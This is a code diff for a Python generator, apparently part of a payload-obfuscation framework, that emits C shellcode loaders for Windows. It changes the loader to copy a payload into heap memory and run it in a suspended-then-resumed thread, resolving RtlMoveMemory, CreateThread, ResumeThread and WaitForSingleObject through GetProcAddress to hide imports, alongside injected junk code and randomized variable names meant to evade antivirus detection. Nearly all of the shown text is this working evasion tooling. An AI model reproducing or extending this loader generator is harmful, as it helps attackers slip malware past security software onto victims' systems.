@@ -23,17 +23,18 @@ import sys
 from random import shuffle
 sys.path.append("Modules/payloads/auxiliar") 
 from usefull import encoding_manager
+from usefull import readpayload_exfile
 from usefull import varname_creator
 from usefull import Junkmathinject
 from usefull import windows_evasion
 from usefull import spawn_multiple_process
 from usefull import close_brackets_multiproc
 
-Payload = sys.argv[1]
+Payload = readpayload_exfile()
 
-SpawnMultiProc = int(sys.argv[2])
+SpawnMultiProc = int(sys.argv[1])
 
-Encryption = sys.argv[3]
+Encryption = sys.argv[2]
 
 Randbufname = varname_creator()
 
@@ -47,6 +48,14 @@ NdcHeapcreate = varname_creator()
 
 NdcHeapalloc = varname_creator()
 
+Ndcrtlmovemem = varname_creator()
+
+Ndccreatethread = varname_creator()
+
+Ndcresumethread = varname_creator()
+
+Ndcwaitforsobj = varname_creator()
+
 Randmem = varname_creator()
 
 Randlpv = varname_creator()
@@ -58,6 +67,8 @@ Randresult = varname_creator()
 Randthread = varname_creator()
 
 Randheapvar = varname_creator()
+
+ResThread = varname_creator()
 
 Junkcode_01 = Junkmathinject()
 Junkcode_02 = Junkmathinject()
@@ -124,14 +135,20 @@ Hollow_code += Randheapvar + " = (HANDLE)" + NdcHeapcreate + "(0x00040000, strle
 Hollow_code += Junkcode_11
 Hollow_code += Randlpv + " = (LPVOID)" + NdcHeapalloc + "(" + Randheapvar + ", 0x00000008, strlen(" + Randbufname + "));\n"
 Hollow_code += Junkcode_12
-Hollow_code += Junkcode_13
 if DecoderStub != "False":
     Hollow_code += DecoderStub
-Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
+Hollow_code += "FARPROC " + Ndcrtlmovemem + " = GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlMoveMemory\");\n"
+Hollow_code += Ndcrtlmovemem + "(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
+Hollow_code += Junkcode_13
+Hollow_code += "FARPROC " + Ndccreatethread + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CreateThread\");\n"
+Hollow_code += Randhand + " = (HANDLE) " + Ndccreatethread + "(NULL,0," + Randlpv + ",NULL,0x00000004,&"+ Randthread + ");\n"
 Hollow_code += Junkcode_14
+Hollow_code += "DWORD " + ResThread + ";\n"
 Hollow_code += Junkcode_15
-Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
-Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n"
+Hollow_code += "FARPROC " + Ndcresumethread + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"ResumeThread\");\n"
+Hollow_code += "FARPROC " + Ndcwaitforsobj + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WaitForSingleObject\");\n"
+Hollow_code += ResThread + " = (DWORD)" + Ndcresumethread + "("+ Randhand + ");\n"
+Hollow_code += Randresult + " = (DWORD)" + Ndcwaitforsobj + "(" + Randhand + ",-1);\n"
 Hollow_code += close_brackets_multiproc(SpawnMultiProc) 
 Hollow_code += "}else{" + Junkcode_16 + "}\n"
 Hollow_code += "}else{" + Junkcode_17 + "}\n"
